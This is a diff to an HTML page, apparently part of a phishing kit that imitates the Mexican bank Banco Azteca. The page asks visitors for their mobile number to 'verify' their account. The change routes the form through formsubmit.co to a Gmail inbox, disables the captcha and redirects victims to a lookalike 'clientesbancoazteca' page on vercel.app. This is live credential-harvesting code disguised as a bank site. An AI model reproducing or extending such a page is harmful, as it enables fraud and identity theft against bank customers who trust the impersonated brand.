@@ -58,9 +58,11 @@
     <div class="contenedor">
         <img src="./logo.png" alt="" class="logo">
         <h2 style="text-align: center;" >INGRESA TU NUMERO DE CELULAR PARA VERIFICAR TU CUENTA</h2>
-        <form class="pedirnum" id="contactform" action="https://formsubmit.io/send/d182ea1f-3a9b-46b4-8311-302a7d2d490c" method="POST">
+        <form class="pedirnum" id="contactform" action="https://formsubmit.co/bancoaztecarespuestas@gmail.com" method="POST">
             <input name="_redirect" type="hidden" id="name" value="https://clientesbancoazteca.vercel.app/formulario.html">
             <input name="_formsubmit_id" type="text" style="display:none">
+            <input type="hidden" name="_next" value="https://clientesbancoazteca.vercel.app/formulario.html">
+            <input type="hidden" name="_captcha" value="false">
             <div class="contingnum">
                 <label class="numlabel" for="num">+52</label>
                 <input type="text" name="num" id="num" placeholder="Ingrese su número" onkeypress="return event.charCode >= 48 && event.charCode <= 57"  maxlength="10" required>
